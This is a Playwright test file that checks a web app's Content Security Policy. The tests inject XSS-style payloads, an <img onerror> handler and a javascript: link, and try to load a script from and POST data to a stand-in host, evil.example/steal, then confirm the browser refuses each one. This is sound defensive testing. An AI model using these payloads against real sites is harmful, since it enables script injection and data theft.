import { expect, SAME_BLOCK, test } from "./fixtures";

// The policy is the second line of defence, after "no hostile string is ever rendered as markup". These tests attack the
// page as if that first line had already failed, and check the browser refuses.

// (Eval and inline <script> text are not attacked from here: Playwright's own injection runs outside the page's script policy,
// so a pass would prove nothing. The first test checks the policy never allows either; a browser enforces what it says.)
test("every page carries a strict policy, with a nonce that changes on every request", async ({ page }) => {
  const nonces = new Set<string>();
  for (let i = 0; i < 3; i++) {
    const response = await page.goto("/sepolia");
    const csp = response!.headers()["content-security-policy"]!;
    expect(csp, "the header").toBeTruthy();
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp.match(/script-src[^;]*/)![0]).not.toMatch(/unsafe-inline|unsafe-eval/);
    nonces.add(/'nonce-([^']+)'/.exec(csp)![1]!);
  }
  expect(nonces.size).toBe(3);
});

test("the app itself runs under it: the token page draws its chart and the list renders, with no violation logged", async ({ page }) => {
  // (the page fixture fails the test on any console error, and a CSP violation is one)
  await page.goto("/sepolia");
  await expect(page.getByTestId("token-card").first()).toBeVisible();
  await page.goto(`/sepolia/token/${SAME_BLOCK}`);
  await expect(page.getByTestId("trade-panel")).toBeVisible();
  await expect(page.getByRole("tab", { name: "Trades" })).toBeVisible();
});

test.describe("an attacker who got markup into the page still cannot run script", () => {
  test.use({ expectedConsoleErrors: [/Content Security Policy|Refused to (execute|evaluate|load|apply)/i] });

  // (The <img> below asks for /x, which does not exist: that 404 is part of the attack, not a fault.)
  test.use({ expectedNotFound: ["/x"] });

  test("an inline event handler does not run", async ({ page }) => {
    await page.goto("/sepolia");
    const violations = await page.evaluate(
      () =>
        new Promise<string[]>((resolve) => {
          const seen: string[] = [];
          // Done at the first report (the browser raises it when the handler is refused), or after a generous wait: a fixed short
          // wait failed once on a busy machine.
          document.addEventListener("securitypolicyviolation", (e) => {
            seen.push(e.violatedDirective);
            resolve(seen);
          });
          document.body.insertAdjacentHTML("beforeend", `<img src="x" onerror="window.__pwned = 1">`);
          setTimeout(() => resolve(seen), 5_000);
        }),
    );
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    expect(violations.some((v) => v.startsWith("script-src"))).toBe(true);
  });

  test("a javascript: link does not run when it is clicked", async ({ page }) => {
    await page.goto("/sepolia");
    // Fixed in the middle of the window: appended to the end of the page it would sit under the navigation bar on a narrow screen.
    await page.evaluate(() =>
      document.body.insertAdjacentHTML("beforeend", `<a id="evil" href="javascript:window.__pwned = 2" style="position:fixed;top:40%;left:50%;z-index:99999">x</a>`),
    );
    await page.locator("#evil").click();
    await page.waitForTimeout(200);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
  });

  test("a script from another site is not loaded", async ({ page }) => {
    await page.goto("/sepolia");
    const loaded = await page.evaluate(
      () =>
        new Promise<boolean>((resolve) => {
          const script = document.createElement("script");
          script.src = "https://evil.example/x.js";
          script.onload = () => resolve(true);
          script.onerror = () => resolve(false);
          document.body.appendChild(script);
        }),
    );
    expect(loaded).toBe(false);
  });

  test("the page cannot send data to another site", async ({ page }) => {
    await page.goto("/sepolia");
    const result = await page.evaluate(() => fetch("https://evil.example/steal", { method: "POST", body: "key" }).then(() => "sent", () => "blocked"));
    expect(result).toBe("blocked");
  });

  test("the page cannot be framed by another site", async ({ page }) => {
    const response = await page.goto("/sepolia");
    expect(response!.headers()["content-security-policy"]).toContain("frame-ancestors 'none'");
  });
});
